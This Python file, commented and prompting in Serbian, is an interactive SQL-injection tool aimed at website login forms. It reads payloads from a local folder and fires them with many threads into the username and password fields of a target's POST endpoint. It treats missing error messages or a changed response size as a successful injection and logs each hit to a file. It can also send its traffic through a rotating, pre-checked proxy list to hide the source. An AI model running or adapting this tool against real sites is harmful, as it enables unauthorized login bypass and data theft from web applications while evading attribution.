from concurrent.futures import ThreadPoolExecutor
import requests
from twill.commands import *
from pyfiglet import figlet_format
import os

class Main():
    i = 0
    iter = 0
    def __init__(self):
        os.system("cls")
        self.rb = 1
        self.proxylista = []
        self.sqlnasao = []

        asciistring = figlet_format("SQLI")
        print(asciistring)

        self.host = input("host sa formom: ")
        self.host2 = input("host sa post requestom (inspet element): ")
        r = requests.get(self.host)
        self.size = len(r.content)
        try:
            go(self.host)
        except:
            print("Nije dobar url!")
        try:
            showforms()
        except:
            print("nije moguce prikazati formu!")

        print("")
        os.chdir("payloads")
        os.system("dir /b")
        os.chdir("..")
        print("")

        payload = input("payload: ")

        username = input("unesi username (Form Name inace 1),(Name) lepo odvojeno zarezom bez razmaka izmedju!: ")
        password = input("unesi password (Form Name inace 1),(Name) lepo odvojeno zarezom bez razmaka izmedju!: ")
        login = input("unesi login (Form Name inace 1),(Name),(Login value ako ima) lepo odvojeno zarezom bez razmaka izmedju!: ")
        username = username.split(sep=",")
        password = password.split(sep=",")
        login = login.split(",")
        if len(login) == 2:
            login.append("")
        
        print("potrazi koji errori imaju kada se unesu pogresni podaci!")
        print("\nUSERNAME I PASSWORD: \n")
        r3 = requests.post(self.host2, data={username[1]:"asddsa", password[1]:"123321", login[1]:login[2]})
        print(r3.text)
        print("\nSAMO USERNAME: \n")
        r3 = requests.post(self.host2, data={username[1]:"asddsa", login[1]:login[2]})
        print(r3.text)
        print("\nSAMO PASSWORD: \n")
        r3 = requests.post(self.host2, data={password[1]:"asddsa", login[1]:login[2]})
        print(r3.text)
        self.stapise = input("pronadji error flags (enter za nista) (ako ima vise lepo odvoji zarezom bez razmaka izmedju!): ")
        self.stapise = self.stapise.split(sep=",")

        if len(self.stapise) == 1 and self.stapise[0] == "":
            self.stapise.remove("")

        radnici = input("broj radnika: ")
        proxy = input("proxy da/ne: ")

        if proxy == "da":
            os.system("start /wait cmd /k python checkproxy.py")
            print("Pravim hierarhiju proxya, sacekaj...")
            with open("proxylist.txt", "r") as proxylist:
                proxylines = proxylist.readlines()
                with ThreadPoolExecutor(len(proxylines)) as exe:
                    for line in proxylines:
                        exe.submit(self.proxyhierarchy, line.strip())

        self.rb = 0
        with open("payloads/"+payload, "r") as file:
            payloadlines = file.readlines()
            with ThreadPoolExecutor(int(radnici)) as self.exe:
                for pay in payloadlines:
                    self.exe.submit(self.inekcija, repr(pay), username, password, radnici, login)
        
        if len(self.sqlnasao) != 0:
            print("\nsvi pronadjeni sqli: \n")
            file = open("info.txt", "a")
            for nasao in self.sqlnasao:
                print("pronasao SQLI: " + nasao)
                file.write("pronasao SQLI: " + nasao + "\n")
        else:
            print("nije proandjen SQLI!")


    def inekcija(self, pay, username, password, radnici, login):
        escaped = pay.translate(str.maketrans({
                                          "'":  "\'",
                                          "\"" : "" ,
                                          }))
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
        }
        try:
            if len(self.proxylista) != 0:
                inputproxy = self.proxylista[Main.i]
                proxy = {
                    "https":"",
                    "http": ""
                }
                proxy["https"] = "http://"+inputproxy
                proxy["http"] = "http://"+inputproxy
                if self.rb == 0:
                    self.rb += 1
                    print("")
                    print("koristim proxy: " + inputproxy)
                    r2 = requests.get("https://dnsleaktest.com/", proxies=proxy)
                    print(r2.content)
                r = requests.post(self.host2, proxies=proxy, headers=headers, data={username[1]:escaped.replace('\\n', ''), password[1]:escaped.replace('\\n', ''), login[1]:login[2]}, allow_redirects=True, timeout=20)
            else:
                r = requests.post(self.host2, headers=headers, data={username[1]:escaped.replace('\\n', ''), password[1]:escaped.replace('\\n', ''), login[1]:login[2]}, allow_redirects=True, timeout=20)
            
            if len(self.stapise) != 0:
                if len(self.stapise) == 1:
                    if self.stapise[0] not in str(r.content):
                        print("pronasao SQLI: " + escaped.replace('\\n', ''))
                        self.sqlnasao.append(escaped.replace('\\n', ''))
                    else:
                        print("payload: " + escaped.replace('\\n', ''))
                if len(self.stapise) == 2:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content):
                        print("pronasao SQLI: " + escaped.replace('\\n', ''))
                        self.sqlnasao.append(escaped.replace('\\n', ''))
                    else:
                        print("payload: " + escaped.replace('\\n', ''))
                if len(self.stapise) == 3:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content):
                        print("pronasao SQLI: " + escaped.replace('\\n', ''))
                        self.sqlnasao.append(escaped.replace('\\n', ''))
                    else:
                        print("payload: " + escaped.replace('\\n', ''))
                if len(self.stapise) == 4:
                    if self.stapise[0] not in str(r.content) and self.stapise[1] not in str(r.content) and self.stapise[2] not in str(r.content) and self.stapise[3] not in str(r.content):
                        print("pronasao SQLI: " + escaped.replace('\\n', ''))
                        self.sqlnasao.append(escaped.replace('\\n', ''))
                    else:
                        print("payload: " + escaped.replace('\\n', ''))
            
            elif len(self.stapise) == 0:
                if len(r.content) >= self.size + 60 or len(r.content) < self.size:
                    print("pronasao SQLI: " + escaped.replace('\\n', ''))
                    self.sqlnasao.append(escaped.replace('\\n', ''))
                else:
                    print("payload: " + escaped.replace('\\n', ''))
            else:
                print("payload: " + escaped.replace('\\n', ''))
        except requests.exceptions.Timeout:
            Main.iter += 1
            if Main.iter == int(radnici):
                print("proxy timed out: " + self.proxylista[Main.i])
                Main.i += 1
                print("Menjam u proxy: " + self.proxylista[Main.i])
        except requests.exceptions.ProxyError:
            Main.iter += 1
            if Main.iter == int(radnici):
                print("proxy timed out: " + self.proxylista[Main.i])
                Main.i += 1
                print("Menjam u proxy: " + self.proxylista[Main.i])
        except Exception as e:
            print(e)        



    def proxyhierarchy(self, line):
        proxy = {
            "https":""
        }
        proxy["https"] = "http://"+line
        try:
            r = requests.get("https://google.com", proxies=proxy,  headers={"Content-Type":"text"})
            print(str(self.rb) +". "+ line + " : " + str(r.status_code))
            self.proxylista.append(line)
            self.rb += 1
        except:
            pass

if __name__ == "__main__":
    file = open("info.txt", "w")
    Main()